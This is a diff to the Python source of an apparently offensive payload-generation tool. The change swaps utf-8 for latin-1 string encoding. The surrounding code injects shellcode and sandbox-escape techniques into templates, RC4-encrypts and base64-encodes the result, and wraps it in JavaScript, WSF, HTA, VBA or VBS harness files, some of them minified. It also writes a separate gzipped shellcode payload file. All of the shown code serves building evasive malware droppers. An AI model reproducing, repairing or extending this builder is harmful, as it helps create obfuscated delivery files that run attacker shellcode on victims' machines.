@@ -405,7 +405,7 @@ End Sub"""
             except Exception as e:
                 print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
 
-        template_body = template_body.decode(encoding='utf-8')
+        template_body = template_body.decode(encoding='latin-1')
         template_code = template_body.replace("%SANDBOX_ESCAPES%", sandbox_techniques)
 
         delivery_method = "1"
@@ -449,7 +449,7 @@ End Sub"""
                     #    sc_split = [encoded_sc[i:i+100] for i in range(0, len(encoded_sc), 100)]
                     #    for i in sc_split:
                     #else:
-                    template_code = template_code.replace("%SHELLCODE64%", encoded_sc.decode(encoding='utf-8'))
+                    template_code = template_code.replace("%SHELLCODE64%", encoded_sc.decode(encoding='latin-1'))
 
                 else:
                     refs = args.refs
@@ -521,36 +521,36 @@ End Sub"""
 
         key = self.rand_key(10)
         payload_encrypted = self.rc4(key, template_code)
-        payload_encoded = base64.b64encode(payload_encrypted.encode(encoding='utf-8'))
+        payload_encoded = base64.b64encode(payload_encrypted.encode(encoding='latin-1'))
 
         awl_payload_simple = ""
 
         if("js" in file_type or args.comtechnique):
-            harness = self.read_file(source_path + "templates/harness.js").decode(encoding='UTF-8')
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
+            harness = self.read_file(source_path + "templates/harness.js").decode(encoding='latin-1')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='latin-1'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
             awl_payload_simple = template_code
         elif("wsf" in file_type):
-            harness = self.read_file(source_path + "templates/harness.wsf").decode(encoding='utf-8')
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
+            harness = self.read_file(source_path + "templates/harness.wsf").decode(encoding='latin-1')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='latin-1'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
         elif("hta" in file_type):
-            harness = self.read_file(source_path + "templates/harness.hta").decode(encoding='utf-8')
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
+            harness = self.read_file(source_path + "templates/harness.hta").decode(encoding='latin-1')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='latin-1'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
         elif("vba" in file_type):
-            harness = self.read_file(source_path + "templates/harness.vba").decode(encoding='utf-8')
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
+            harness = self.read_file(source_path + "templates/harness.vba").decode(encoding='latin-1')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='latin-1'))
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
             payload_minified = jsmin(payload)
         elif("slk" in file_type):
             pass
         else:
-            harness = self.read_file(source_path + "templates/harness.vbs").decode(encoding='utf-8')
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
+            harness = self.read_file(source_path + "templates/harness.vbs").decode(encoding='latin-1')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='latin-1'))
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
 
         if (payload_type == 3):
@@ -588,7 +588,7 @@ End Sub"""
             outputfile_shellcode = outputfile + ".payload"
             with open(outputfile_shellcode, 'w') as f:
                 gzip_encoded = base64.b64encode(shellcode_gzip.getvalue())
-                f.write(gzip_encoded.decode(encoding='utf-8'))
+                f.write(gzip_encoded.decode(encoding='latin-1'))
                 f.close()
                 print("\033[1;34m[*]\033[0;0m Written shellcode payload to %s" % outputfile_shellcode)
 
